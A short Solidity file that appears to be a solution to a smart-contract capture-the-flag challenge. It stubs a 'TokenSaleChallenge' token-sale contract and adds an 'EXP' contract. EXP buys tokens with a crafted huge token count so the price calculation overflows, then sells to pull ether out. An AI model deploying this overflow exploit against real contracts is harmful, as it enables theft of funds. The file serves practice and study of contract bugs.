pragma solidity ^0.4.21;

contract TokenSaleChallenge {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    function TokenSaleChallenge(address _player) public payable {}

    function isComplete() public view returns (bool) {}

    function buy(uint256 numTokens) public payable {}

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);

        balanceOf[msg.sender] -= numTokens;
        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);
    }
}

contract EXP {
    TokenSaleChallenge victim;
    constructor(address _addr){
        victim  = TokenSaleChallenge(_addr);
    }

    function buy() public payable {
        victim.buy.value(415992086870360064 wei)(115792089237316195423570985008687907853269984665640564039458);
    }

    function sell() public payable {
        victim.sell(1);
    }
}